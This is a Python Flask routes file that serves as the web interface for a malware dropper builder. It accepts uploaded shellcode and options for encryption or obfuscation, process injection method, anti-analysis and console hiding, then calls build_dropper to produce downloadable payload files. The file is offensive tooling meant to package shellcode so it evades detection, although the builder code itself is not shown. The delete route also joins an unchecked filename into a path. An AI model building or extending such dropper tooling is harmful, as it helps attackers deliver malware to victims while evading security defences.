import os
import tempfile
from datetime import datetime
from flask import Flask, render_template, request, redirect, url_for, send_from_directory, jsonify

from dropper_builder import fetch_available_modules, build_dropper


def init_routes(app):
    @app.route("/")
    def index():
        # Get the list of files in the upload folder
        files = os.listdir(app.config['OUTPUT_FOLDER'])
        # Get file details
        file_details = []
        for file in files:
            file_path = os.path.join(app.config['OUTPUT_FOLDER'], file)
            file_size = os.path.getsize(file_path)
            file_modified_time = os.path.getmtime(file_path)
            file_modified_time_str = datetime.fromtimestamp(file_modified_time).strftime('%Y-%m-%d %H:%M:%S')
            file_details.append({
                'name': file,
                'size': file_size,
                'modified_time': file_modified_time_str
            })
        return render_template('index.html', files=file_details)

    @app.route("/config", methods=["GET"])
    def config():
        modules = fetch_available_modules()
        return render_template("dropper_config.html", modules=modules)

    
    @app.route('/download/<filename>')
    def download_file(filename):
        return send_from_directory(app.config['OUTPUT_FOLDER'], filename, as_attachment=True)

    @app.route('/delete/<filename>', methods=['DELETE'])
    def delete_file(filename):
        file_path = os.path.join(app.config['OUTPUT_FOLDER'], filename)
        
        if os.path.exists(file_path):
            os.remove(file_path)
            return jsonify({"message": f"'{filename}' has been deleted."}), 200
        else:
            return jsonify({"error": f"'{filename}' not found."}), 404
    
    @app.route('/upload', methods=['POST'])
    def upload_file():
        # Handle checkbox inputs
        encryption_or_obfuscation = request.form.get('encryption', None) or request.form.get('obfuscation', None)
        if encryption_or_obfuscation:
            encryption_or_obfuscation = encryption_or_obfuscation.lower()
        else:
            encryption_or_obfuscation = ""
        #encryption_or_obfuscation = encryption_or_obfuscation.split(' ')[0]
        injection_method = request.form.get('injection', None)
        anti_analysis = request.form.get('anti_analysis', None) is not None
        debug_enabled = request.form.get('debug', None) is not None
        hide_console = request.form.get('hide_console', None) is not None

        # Handle file upload
        if 'shellcode' in request.files:
            file = request.files['shellcode']
            if file.filename != '':
                with tempfile.NamedTemporaryFile(delete=False) as temp_file:
                    temp_file.write(file.read())  # Write file content to temp file
                    shellcode_path = temp_file.name
            else:
                shellcode_path = None
        else:
            shellcode_text = request.form.get('shellcode_text')

        # Handle filename and file extension
        out_filename = request.form.get('filename')
        out_file_extension = request.form.get('file_extension')

        # Process the inputs as needed
        # For example, you can print them or save them to a database
        print(f"Encryption/Obfuscation: {encryption_or_obfuscation}")
        print(f"Anti Analysis: {anti_analysis}")
        print(f"Injection Method: {injection_method}")
        if shellcode_path:
            print(f"Shellcode Path: {shellcode_path}")
        else:
            print(f"Shellcode Text: {shellcode_text}")
        print(f"Output Filename: {out_filename}{out_file_extension}")
        print(f"Debug Enabled: {debug_enabled}")
        
        build_dropper(
            debug_enabled=debug_enabled,
            out_filename=f"{out_filename}{out_file_extension}",
            shellcode_path=shellcode_path,
            out_file_extension=out_file_extension,
            encryption_or_obfuscation=encryption_or_obfuscation,
            anti_analysis=anti_analysis,
            injection_method=injection_method,
            hide_console=hide_console
        )

        return redirect(url_for('index'))
